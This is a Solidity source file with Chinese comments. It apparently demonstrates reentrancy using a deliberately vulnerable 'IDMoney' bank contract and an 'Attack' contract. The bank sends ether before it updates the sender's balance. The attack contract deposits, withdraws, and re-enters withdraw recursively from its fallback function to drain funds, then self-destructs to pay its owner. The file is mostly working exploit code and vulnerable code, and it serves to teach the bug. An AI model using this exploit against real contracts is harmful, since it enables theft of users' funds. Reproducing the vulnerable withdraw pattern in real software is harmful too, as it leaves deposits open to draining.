pragma solidity ^0.4.25;

contract IDMoney {
    address owner;
    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况

    event withdrawLog(address, uint256);
    
    constructor() public { owner = msg.sender; }
    function deposit() public payable { balances[msg.sender] += msg.value; }
    function withdraw(address to, uint256 amount) public {
        require(balances[msg.sender] > amount);
        require(this.balance > amount);

        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
        
        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
        balances[msg.sender] -= amount;
    }
    function balanceOf() public view returns (uint256) { return balances[msg.sender]; }
    function balanceOf(address addr) public view returns (uint256) { return balances[addr]; }
     // 查看当前调用者在AMoney合约中的ether数
    function getMoney() public view returns(uint256){
            return balances[msg.sender];
   }
}
contract Attack {
    address owner;
    address victim;

    modifier ownerOnly { require(owner == msg.sender); _; }
    
    constructor() public payable { owner = msg.sender; }
    
    // 设置已部署的 IDMoney 合约实例地址
    function setVictim(address target) public ownerOnly { victim = target; }
    
    // deposit Ether to IDMoney deployed
    function step1(uint256 amount) public ownerOnly payable {
        if (this.balance > amount) {
            victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    // withdraw Ether from IDMoney deployed
    function step2(uint256 amount) public ownerOnly {
        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
    }
    // 自毁，将所有余额发送给业主
    function stopAttack() public ownerOnly {
        selfdestruct(owner);
    }

    function startAttack(uint256 amount) public ownerOnly {
        step1(amount);
        step2(amount / 2);
    }

    function () public payable {
        if (msg.sender == victim) {
            // 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
        }
    }
}